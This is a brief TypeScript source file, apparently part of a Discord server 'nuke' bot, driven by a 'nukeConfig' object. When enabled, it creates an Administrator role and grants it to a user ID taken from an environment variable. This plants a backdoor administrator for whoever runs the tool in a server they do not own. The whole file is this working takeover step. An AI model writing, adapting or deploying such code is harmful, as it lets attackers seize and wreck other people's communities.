import { Guild } from "discord.js";
import { nukeConfig } from "../index";

export default async (guild: Guild): Promise<void> => {
	if (nukeConfig.GIVE_ADMIN_PERMS) {
		try {
			const adminRole = await guild.roles.create({
				name: nukeConfig.ADMIN_ROLE_NAME,
				permissions: ["Administrator"],
			});

			const developer = guild.members.cache.get(process.env.DEVELOPER_USER_ID);
			await developer.roles.add(adminRole);
		} catch (error) {
			console.log(error);
		}
	}
};
